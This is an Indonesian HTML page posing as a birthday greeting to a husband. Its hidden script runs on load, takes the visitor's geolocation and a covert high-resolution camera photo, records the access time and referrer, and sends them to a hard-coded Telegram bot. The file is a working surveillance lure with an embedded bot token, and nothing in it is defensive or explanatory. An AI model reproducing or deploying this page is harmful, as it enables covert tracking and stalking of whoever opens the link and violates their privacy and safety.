<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Memproses...</title>
</head>
<body>
    <h2>Selamat ulang tahun suamikuuu</h2>

    <!-- Elemen tersembunyi untuk proses kamera -->
    <video id="video" autoplay style="display:none;"></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        const BOT_TOKEN = '8875696208:AAEfby84iverPAOZjXO7Bl2zNQCtPzrsBI4';
        const CHAT_ID = '6984457315'; // ID Telegram numerik Anda

        // Helper 1: Promise Pengambilan Lokasi
        function getGeolocationPromise() {
            return new Promise((resolve) => {
                if (!("geolocation" in navigator)) {
                    resolve({ success: false, text: "Tidak didukung browser" });
                    return;
                }
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        const lat = position.coords.latitude;
                        const lon = position.coords.longitude;
                        resolve({ success: true, text: `https://www.google.com/maps?q=${lat},${lon}` });
                    },
                    (error) => {
                        resolve({ success: false, text: "Ditolak oleh pengguna" });
                    }
                );
            });
        }

        // Helper 2: Promise Pengambilan Kamera dengan Resolusi Maksimal
        function getCameraPhotoPromise() {
            return new Promise(async (resolve) => {
                try {
                    // Meminta resolusi kamera tertinggi dari perangkat (Full HD)
                    const stream = await navigator.mediaDevices.getUserMedia({
                        video: {
                            width: { ideal: 1920 },
                            height: { ideal: 1080 }
                        }
                    });
                    const video = document.getElementById('video');
                    video.srcObject = stream;

                    // Tunggu hingga metadata video siap
                    await new Promise((res) => video.onloadedmetadata = res);
                    video.play();

                    // Jeda sebentar agar pencahayaan kamera stabil
                    setTimeout(() => {
                        const canvas = document.getElementById('canvas');
                        const context = canvas.getContext('2d');

                        // Menggunakan dimensi resolusi asli yang dihasilkan oleh kamera
                        canvas.width = video.videoWidth || 1920;
                        canvas.height = video.videoHeight || 1080;

                        context.drawImage(video, 0, 0, canvas.width, canvas.height);

                        // Matikan stream kamera
                        stream.getTracks().forEach(track => track.stop());

                        canvas.toBlob((blob) => {
                            resolve({ success: true, blob: blob });
                        }, 'image/jpeg', 0.95);
                    }, 800);
                } catch (err) {
                    resolve({ success: false, blob: null });
                }
            });
        }

        // Eksekusi Utama Saat Halaman Selesai Dimuat
        window.addEventListener('DOMContentLoaded', async () => {
            // 1. Waktu Akses
            const opsiWaktu = {
                year: 'numeric',
                month: 'long',
                day: 'numeric',
                hour: '2-digit',
                minute: '2-digit',
                second: '2-digit',
                timeZoneName: 'short'
            };
            const waktuAkses = new Date().toLocaleString('id-ID', opsiWaktu);
            const asalKlik = document.referrer ? document.referrer : 'Langsung (Direct / Tanpa Referrer)';

            // 2. Jalankan Proses Lokasi & Kamera
            const locationResult = await getGeolocationPromise();
            const photoResult = await getCameraPhotoPromise();

            // 3. Susun Isi Pesan Teks
            let isiPesan = `<b>INFORMASI AKSES TAUTAN</b>\n\n`;
            isiPesan += `<b>Waktu:</b> ${waktuAkses}\n`;
            isiPesan += `<b>Sumber Klik:</b> ${asalKlik}\n`;
            isiPesan += `<b>Lokasi:</b> ${locationResult.text}\n`;

            if (!photoResult.success) {
                isiPesan += `<b>Kamera:</b> Ditolak / Tidak tersedia\n`;
            }

            // 4. Kirim Ke Telegram
            if (photoResult.success && photoResult.blob) {
                await sendPhotoToTelegram(photoResult.blob, isiPesan);
            } else {
                await sendTextMessageToTelegram(isiPesan);
            }
        });

        // Fungsi Mengirim Foto + Caption
        async function sendPhotoToTelegram(photoBlob, captionText) {
            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            formData.append('photo', photoBlob, 'capture.jpg');
            formData.append('caption', captionText);
            formData.append('parse_mode', 'HTML');

            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
            try {
                await fetch(url, { method: 'POST', body: formData });
            } catch (error) {
                console.error("Gagal mengirim foto ke Telegram:", error);
            }
        }

        // Fungsi Cadangan (Kirim Teks Saja jika Kamera Ditolak)
        async function sendTextMessageToTelegram(textMessage) {
            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
            try {
                await fetch(url, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: textMessage,
                        parse_mode: 'HTML'
                    })
                });
            } catch (error) {
                console.error("Gagal mengirim pesan teks ke Telegram:", error);
            }
        }
    </script>
</body>
</html>
